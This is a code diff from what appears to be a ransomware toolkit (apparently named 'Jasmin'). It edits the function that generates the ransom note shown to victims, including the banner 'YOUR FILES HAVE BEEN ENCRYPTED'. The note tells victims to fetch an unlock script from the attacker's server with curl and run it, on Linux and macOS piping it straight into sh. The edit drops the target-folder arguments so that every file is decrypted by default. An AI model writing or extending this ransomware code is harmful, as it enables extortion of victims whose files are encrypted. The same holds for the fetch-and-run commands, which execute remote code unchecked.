@@ -417,11 +417,11 @@ def generate():
     if plat == 'win':
         dec = ('Windows (requires PowerShell 7+)\n'
                f'  curl.exe -sL {srv}/payloads/jasmin_unlock.ps1 -o unlock.ps1\n'
-               f'  pwsh -File unlock.ps1 -Server {srv} -K "<passphrase>" -Paths C:\\TargetFolder')
+               f'  pwsh -File unlock.ps1 -Server {srv} -K "<passphrase>"')
     else:
         dec = ('Linux / macOS (pure openssl, no dependencies required)\n'
-               f'  curl -sL {srv}/payloads/jasmin_unlock.sh | sh -s {srv} "<passphrase>" <target_folder>\n'
-               '  (Request the passphrase and target folder from us)')
+               f'  curl -sL {srv}/payloads/jasmin_unlock.sh | sh -s {srv} "<passphrase>"')
+    dec += '\n  (Decrypts ALL encrypted files by default; append specific folders to limit scope)'
     _t = ransom['title']
     _sub = '' if 'ENCRYPT' in _t.upper() else '║  YOUR FILES HAVE BEEN ENCRYPTED\n'
     note = (f"╔══════════════════════════════════════════╗\n║  {_t}\n{_sub}"
